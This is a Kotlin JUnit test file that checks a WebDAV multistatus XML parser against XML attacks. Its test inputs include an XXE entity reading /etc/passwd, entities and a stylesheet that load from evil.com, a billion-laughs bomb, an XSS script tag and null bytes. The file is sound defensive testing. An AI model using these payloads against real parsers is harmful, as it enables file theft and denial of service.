package org.onekash.icaldav.xml

import org.onekash.icaldav.model.DavResult
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.Nested
import org.junit.jupiter.api.DisplayName
import kotlin.test.assertTrue
import kotlin.test.assertFalse
import kotlin.test.assertEquals

/**
 * Security tests for XML parsing - XXE prevention and entity expansion attacks.
 *
 * The MultiStatusParser uses regex-based parsing which is inherently immune to
 * XXE attacks since it doesn't use an XML parser that processes external entities.
 * These tests document and verify this safety characteristic.
 *
 * RFC 5323 (WebDAV SEARCH) and RFC 4918 (WebDAV) responses are parsed here.
 */
@DisplayName("XXE Prevention and XML Security Tests")
class XxePreventionTest {

    private val parser = MultiStatusParser()

    @Nested
    @DisplayName("XXE Attack Prevention")
    inner class XxeAttackTests {

        @Test
        fun `external entity reference in response is treated as literal text`() {
            // Classic XXE attack pattern - should NOT be processed
            val maliciousXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [
                    <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/&xxe;</D:href>
                        <D:propstat>
                            <D:prop>
                                <D:displayname>Test</D:displayname>
                            </D:prop>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(maliciousXml)

            // Parser should succeed (regex parsing ignores DOCTYPE)
            assertTrue(result is DavResult.Success)
            val multiStatus = result.getOrNull()!!

            // The entity reference should remain as literal text, NOT expanded
            val response = multiStatus.responses.firstOrNull()
            assertTrue(response != null, "Should have parsed a response")
            // &xxe; should either be literal or stripped, never /etc/passwd content
            assertFalse(
                response!!.href.contains("/etc/passwd"),
                "XXE entity should not be expanded to file contents"
            )
        }

        @Test
        fun `parameter entity reference is not expanded`() {
            // Parameter entity XXE variant
            val maliciousXml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [
                    <!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
                    %xxe;
                ]>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/event.ics</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(maliciousXml)

            // Should succeed without making external requests
            assertTrue(result is DavResult.Success)
        }

        @Test
        fun `SYSTEM keyword in content is safe`() {
            // SYSTEM keyword appearing in content (not as DTD) should be safe
            val xml = """
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/SYSTEM-event.ics</D:href>
                        <D:propstat>
                            <D:prop>
                                <D:displayname>SYSTEM Test Event</D:displayname>
                            </D:prop>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
            val multiStatus = result.getOrNull()!!
            assertTrue(multiStatus.responses[0].href.contains("SYSTEM"))
        }
    }

    @Nested
    @DisplayName("Billion Laughs (Entity Expansion) Prevention")
    inner class BillionLaughsTests {

        @Test
        fun `billion laughs attack pattern is not expanded`() {
            // Classic billion laughs / XML bomb
            val maliciousXml = """
                <?xml version="1.0"?>
                <!DOCTYPE lolz [
                    <!ENTITY lol "lol">
                    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
                    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                ]>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/&lol4;</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(maliciousXml)

            // Should succeed quickly without memory explosion
            assertTrue(result is DavResult.Success)
            val multiStatus = result.getOrNull()!!

            // Response href should NOT contain expanded "lol" strings
            val href = multiStatus.responses.firstOrNull()?.href ?: ""
            // If billion laughs were expanded, this would be millions of "lol"
            assertTrue(href.length < 10000, "Entity expansion should not occur")
        }

        @Test
        fun `quadratic blowup attack is safe`() {
            // Quadratic blowup variant
            val maliciousXml = """
                <?xml version="1.0"?>
                <!DOCTYPE kaboom [
                    <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
                ]>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(maliciousXml)

            assertTrue(result is DavResult.Success)
            // Href should not contain expanded content
            val href = result.getOrNull()!!.responses.firstOrNull()?.href ?: ""
            assertFalse(href.contains("aaaa"), "Internal entities should not expand")
        }
    }

    @Nested
    @DisplayName("DOCTYPE Handling")
    inner class DoctypeTests {

        @Test
        fun `DOCTYPE declaration does not affect parsing`() {
            val xmlWithDoctype = """
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE multistatus SYSTEM "http://example.com/fake.dtd">
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/event.ics</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xmlWithDoctype)

            assertTrue(result is DavResult.Success)
            assertEquals(1, result.getOrNull()!!.responses.size)
        }

        @Test
        fun `inline DTD is ignored`() {
            val xmlWithInlineDtd = """
                <?xml version="1.0"?>
                <!DOCTYPE multistatus [
                    <!ELEMENT multistatus (response*)>
                    <!ELEMENT response (href, propstat)>
                ]>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/test</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xmlWithInlineDtd)

            assertTrue(result is DavResult.Success)
        }
    }

    @Nested
    @DisplayName("CDATA Section Handling")
    inner class CdataSectionTests {

        @Test
        fun `CDATA section in calendar-data is properly extracted`() {
            // iCloud wraps calendar data in CDATA
            val xml = """
                <D:multistatus xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
                    <D:response>
                        <D:href>/cal/event.ics</D:href>
                        <D:propstat>
                            <D:prop>
                                <C:calendar-data><![CDATA[BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
UID:test@example.com
SUMMARY:Test Event
END:VEVENT
END:VCALENDAR]]></C:calendar-data>
                            </D:prop>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
            val calData = result.getOrNull()!!.responses[0].calendarData
            assertTrue(calData != null, "Calendar data should be extracted")
            assertTrue(calData!!.contains("BEGIN:VCALENDAR"), "CDATA content should be preserved")
            assertFalse(calData.contains("CDATA"), "CDATA markers should be removed")
        }

        @Test
        fun `nested CDATA-like text is handled`() {
            // What if someone tries to escape CDATA?
            val xml = """
                <D:multistatus xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
                    <D:response>
                        <D:href>/cal/event.ics</D:href>
                        <D:propstat>
                            <D:prop>
                                <C:calendar-data><![CDATA[BEGIN:VCALENDAR
DESCRIPTION:Contains ]]> in text
END:VCALENDAR]]></C:calendar-data>
                            </D:prop>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            // This is a malformed CDATA (contains ]]> inside)
            // Regex parser will handle it gracefully - test passes if no exception thrown
            // Result may be success or partial parse depending on implementation
            assertTrue(result is DavResult.Success, "Parser should handle malformed CDATA gracefully")
        }
    }

    @Nested
    @DisplayName("Processing Instruction Handling")
    inner class ProcessingInstructionTests {

        @Test
        fun `XML processing instructions are ignored`() {
            val xml = """
                <?xml version="1.0" encoding="UTF-8"?>
                <?xml-stylesheet type="text/xsl" href="http://evil.com/steal-data.xsl"?>
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/event.ics</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            // Should parse without fetching XSL
            assertTrue(result is DavResult.Success)
        }
    }

    @Nested
    @DisplayName("Malicious Content Patterns")
    inner class MaliciousContentTests {

        @Test
        fun `script tags in displayname are treated as text`() {
            val xml = """
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/</D:href>
                        <D:propstat>
                            <D:prop>
                                <D:displayname><script>alert('xss')</script></D:displayname>
                            </D:prop>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
            // The displayname may or may not include the script tags
            // depending on regex matching, but they're treated as text, not executed
        }

        @Test
        fun `null bytes in XML are handled`() {
            val xml = """
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/test${'\u0000'}event.ics</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            // Should handle null bytes gracefully - test passes if no exception thrown
            assertTrue(result is DavResult.Success, "Parser should handle null bytes gracefully")
        }

        @Test
        fun `extremely long element content is handled`() {
            val longContent = "A".repeat(100_000)
            val xml = """
                <D:multistatus xmlns:D="DAV:">
                    <D:response>
                        <D:href>/calendar/$longContent.ics</D:href>
                        <D:propstat>
                            <D:status>HTTP/1.1 200 OK</D:status>
                        </D:propstat>
                    </D:response>
                </D:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
            val href = result.getOrNull()!!.responses[0].href
            assertTrue(href.length > 100_000, "Long content should be preserved")
        }
    }

    @Nested
    @DisplayName("Namespace Confusion Prevention")
    inner class NamespaceTests {

        @Test
        fun `mixed namespace prefixes are handled`() {
            // Different servers use different prefixes (D:, d:, DAV:, etc.)
            val xml = """
                <d:multistatus xmlns:d="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
                    <d:response>
                        <D:href xmlns:D="DAV:">/calendar/event.ics</D:href>
                        <d:propstat>
                            <d:status>HTTP/1.1 200 OK</d:status>
                        </d:propstat>
                    </d:response>
                </d:multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
            assertEquals(1, result.getOrNull()!!.responses.size)
        }

        @Test
        fun `no namespace prefix is handled`() {
            // Some servers don't use prefixes
            val xml = """
                <multistatus xmlns="DAV:">
                    <response>
                        <href>/calendar/event.ics</href>
                        <propstat>
                            <status>HTTP/1.1 200 OK</status>
                        </propstat>
                    </response>
                </multistatus>
            """.trimIndent()

            val result = parser.parse(xml)

            assertTrue(result is DavResult.Success)
        }
    }
}
